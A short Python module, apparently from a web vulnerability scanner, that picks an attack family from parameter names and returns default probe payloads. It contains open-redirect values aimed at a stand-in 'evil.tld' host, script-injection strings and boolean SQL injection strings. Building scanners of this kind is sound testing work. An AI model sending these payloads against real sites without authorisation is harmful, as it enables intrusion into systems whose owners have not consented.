from __future__ import annotations

REDIRECT_HINTS = {"to","return_to","redirect","url","next","callback","continue","target","dest","link"}
XSS_HINTS = {"q","query","search","comment","message","content","title","name"}
SQLI_HINTS = {"id","ids","uid","user","user_id","pid","productid","order","page","sort","filter","cat","category"}

def choose_family(method: str, url: str, param: str, content_type: str | None) -> str:
    p = (param or "").lower()
    u = (url or "").lower()
    ct = (content_type or "").lower()

    if p in REDIRECT_HINTS or "redirect" in u:
        return "redirect"
    if p in XSS_HINTS and ("html" in ct or "json" not in ct):
        return "xss"
    if p in SQLI_HINTS:
        return "sqli"
    # default: bias to SQLi for query-like GETs, else XSS
    return "sqli" if (method or "").upper() in ("GET","POST") else "xss"

def default_payloads_by_family(family: str) -> list[str]:
    if family == "redirect":
        return ["https://example.org/", "//evil.tld", "https:%2f%2fevil.tld", "/\\evil", "///evil.tld"]
    if family == "xss":
        return [
            "\"/><script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "'\"><img src=x onerror=alert(1)>",
        ]
    # sqli (db-agnostic boolean-based)
    return ["' OR 1=1--", "' OR 'a'='b'--", "\" OR \"a\"=\"a\" --"]
